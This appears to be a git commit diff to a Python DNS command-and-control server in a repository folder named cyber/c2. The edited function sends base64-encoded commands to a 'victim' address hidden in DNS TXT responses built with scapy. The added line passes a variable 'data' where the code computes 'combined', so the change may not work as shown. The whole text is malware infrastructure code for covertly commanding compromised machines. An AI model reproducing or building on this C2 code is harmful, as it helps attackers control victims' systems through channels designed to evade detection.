3f8d0e604589738ae259069a375b132c8ba72664
daniel.meshorer <danielmeshorer@gmail.com>
2023-04-30 22:44:31 +0300

    check

--- cyber/c2/dns_c2/server_dns_c2.py
+++ cyber/c2/dns_c2/server_dns_c2.py
@@ -37,8 +37,9 @@ def send_command(ip_adr,vic_sport,get_qname):
 
     combined = base64.b64encode(prefix) + base64.b64encode(bin_command)
     #pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(qd=DNSQR(qtype="TXT", qname=data_recieved,an=DNSRR(rdata=combined)))
-    pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)
-    send_response(pkt_no_dns,get_qname=get_qname,data=combined)
+    # pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)
+    # send_response(pkt_no_dns,get_qname=get_qname,data=combined)
+    send(IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(qd=DNSQR(qtype="TXT", qname=get_qname,an=DNSRR(rdata=data))))
     #pkt_send(pkt_no_data,combined,0)
 
     commands_que = ""
